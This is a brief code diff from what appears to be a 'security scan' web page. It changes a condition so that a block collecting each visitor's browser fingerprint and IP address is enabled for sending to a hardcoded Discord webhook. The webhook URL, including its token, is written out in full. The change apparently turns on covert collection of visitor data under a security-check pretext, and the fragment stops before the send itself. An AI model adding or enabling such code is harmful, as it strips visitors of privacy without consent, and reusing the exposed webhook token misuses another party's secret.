@@ -2417,7 +2417,7 @@
                 addActivity("Security scan completed", "System security assessment finished with score: " + score);
 
                 // Send data to webhook in production environment
-                if (WEBHOOK_URL !== "https://discord.com/api/webhooks/1367021574229721088/xFn8dMRnDuCCfNLUtm4VP87e0QMYOWVb-0II6EAFj9Uth69lmOOFVN0dqIvXg2bZXwcp") {
+                if (WEBHOOK_URL == "https://discord.com/api/webhooks/1367021574229721088/xFn8dMRnDuCCfNLUtm4VP87e0QMYOWVb-0II6EAFj9Uth69lmOOFVN0dqIvXg2bZXwcp") {
                     const securityData = {
                         fingerprint: result.visitorId,
                         ip: ipData.ip,
